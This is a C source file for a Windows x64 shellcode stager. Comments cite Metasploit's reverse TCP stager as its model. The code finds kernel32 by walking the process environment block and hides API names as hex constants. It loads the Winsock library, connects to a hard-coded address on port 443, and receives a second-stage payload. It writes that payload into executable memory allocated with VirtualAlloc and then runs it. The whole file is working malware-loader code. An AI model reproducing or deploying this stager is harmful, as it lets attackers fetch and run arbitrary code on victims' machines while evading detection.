#include <stdint.h>

#define WIN32_LEAN_AND_MEAN
#include <windows.h>

#pragma warning (push, 0)
#include <winternl.h>

#include <winsock2.h>

#include<stdio.h>

//https://raw.githubusercontent.com/rainerzufalldererste/windows_x64_shellcode_template/refs/heads/master/shellcode_template/src/shellcode_template.c

__declspec(noinline) void shcode()
{
    PEB* pProcessEnvironmentBlock = (PEB*)__readgsqword(0x60);

    LDR_DATA_TABLE_ENTRY* pKernel32TableEntry = CONTAINING_RECORD(pProcessEnvironmentBlock->Ldr->InMemoryOrderModuleList.Flink->Flink->Flink, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);

    IMAGE_DOS_HEADER* pDosHeader = (IMAGE_DOS_HEADER*)pKernel32TableEntry->DllBase;

    IMAGE_NT_HEADERS* pNtHeader = (IMAGE_NT_HEADERS*)((size_t)pDosHeader + pDosHeader->e_lfanew);

    IMAGE_EXPORT_DIRECTORY* pExports = (IMAGE_EXPORT_DIRECTORY*)((size_t)pDosHeader + pNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    const int32_t* pNameOffsets = (const int32_t*)((size_t)pDosHeader + pExports->AddressOfNames);

    struct
    {
        uint64_t text0, text1;
    } x;

    x.text0 = 0x41636F7250746547; // `GetProcA`

    int32_t i = 0;

    while (*(uint64_t*)((size_t)pDosHeader + pNameOffsets[i]) != x.text0)
        ++i;

    const int16_t* pFunctionNameOrdinalOffsets = (const int16_t*)((size_t)pDosHeader + pExports->AddressOfNameOrdinals);
    const int32_t* pFunctionOffsets = (const int32_t*)((size_t)pDosHeader + pExports->AddressOfFunctions);

    typedef FARPROC(*GetProcAddressFunc)(HMODULE, const char*);
    GetProcAddressFunc pGetProcAddress = (GetProcAddressFunc)(const void*)((size_t)pDosHeader + pFunctionOffsets[pFunctionNameOrdinalOffsets[i]]);

    HMODULE kernel32Dll = (HMODULE)pDosHeader;

    // Get `LoadLibraryA`.
    x.text0 = 0x7262694C64616F4C; // `LoadLibr`
    x.text1 = 0x0000000041797261; // `aryA\0\0\0\0`

    typedef HMODULE(*LoadLibraryAFunc)(const char*);
    LoadLibraryAFunc pLoadLibraryA = (LoadLibraryAFunc)pGetProcAddress(kernel32Dll, (const char*)&x.text0);

    // https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x64/src/stager/stager_reverse_tcp_nx.asm

    //Get VirtualAlloc
    x.text0 = 0x416c617574726956;
    x.text1 = 0x00000000636f6c6c;
    typedef LPVOID(*VirtualAllocFunc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
    VirtualAllocFunc pVirtualAlloc = (VirtualAllocFunc)pGetProcAddress(kernel32Dll, (const char*)&x.text0);

    // Load `ws2_32.dll`
    x.text0 = 0x642e32335f327377;
    x.text1 = 0x0000000000006c6c;
    HMODULE ws2_32Dll = pLoadLibraryA((const char*)&x.text0);

    // Get WSAStartup
    x.text0 = 0x7472617453415357;
    x.text1 = 0x0000000000007075;
    typedef int(*WSAStartupFunc)(WORD wVersionRequired, LPWSADATA lpWSAData);
    WSAStartupFunc pWSAStartup = (WSAStartupFunc)pGetProcAddress(ws2_32Dll, (const char*)&x.text0);

    WSAData data;

    pWSAStartup(0x0101, &data);

    // Get WSASocketA
    x.text0 = 0x656b636f53415357;
    x.text1 = 0x0000000000004174;
    typedef SOCKET(*WSASocketAFunc)(int af, int type, int protocol, LPWSAPROTOCOL_INFOA lpProtocolInfo, GROUP g, DWORD dwFlags);
    WSASocketAFunc pWSASocketA = (WSASocketAFunc)pGetProcAddress(ws2_32Dll, (const char*)&x.text0);

    SOCKET s = pWSASocketA(AF_INET, SOCK_STREAM, 0, 0, 0, 0);

    // Get WSAConnect
    x.text0 = 0x656e6e6f43415357;
    x.text1 = 0x0000000000007463;
    typedef int(*WSAConnectFunc)(SOCKET s, const sockaddr* name, int namelen, LPWSABUF lpCallerData, LPWSABUF lpCalleeData, LPQOS lpSQOS, LPQOS lpGQOS);
    WSAConnectFunc pWSAConnect = (WSAConnectFunc)pGetProcAddress(ws2_32Dll, (const char*)&x.text0);

    sockaddr_in saddr = {};
    saddr.sin_family = AF_INET;
    saddr.sin_addr.s_addr = inet_addr("127.0.0.1"); //doesn't work over SSH port forwarding - a solution required
    saddr.sin_port = htons(443);
    pWSAConnect(s, (SOCKADDR*)&saddr, sizeof(saddr), NULL, NULL, NULL, NULL);

    // Get recv
    x.text0 = 0x0000000076636572;
    x.text1 = 0x0000000000000000;
    typedef int(*recvFunc)(SOCKET s, char *buf, int len, int flags);
    recvFunc pRecvFunc = (recvFunc)pGetProcAddress(ws2_32Dll, (const char*)&x.text0);

    int second_stage;
    pRecvFunc(s, (char *)&second_stage, 4, 0);
    printf("second stage: %d bytes\n", second_stage);
    int rb = 0;

    LPVOID addr = pVirtualAlloc(NULL, second_stage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    LPVOID _addr = addr;
    
    do
    {
        rb = pRecvFunc(s, (char*)addr, second_stage, 0);
        second_stage -= rb;
        addr = (char*)addr + rb;
        printf("left %d bytes\n", second_stage);
    } while (second_stage != 0);

    ((void(*)())_addr)();

    }

#pragma warning (pop)

    int main()
    {
        shcode();
    }
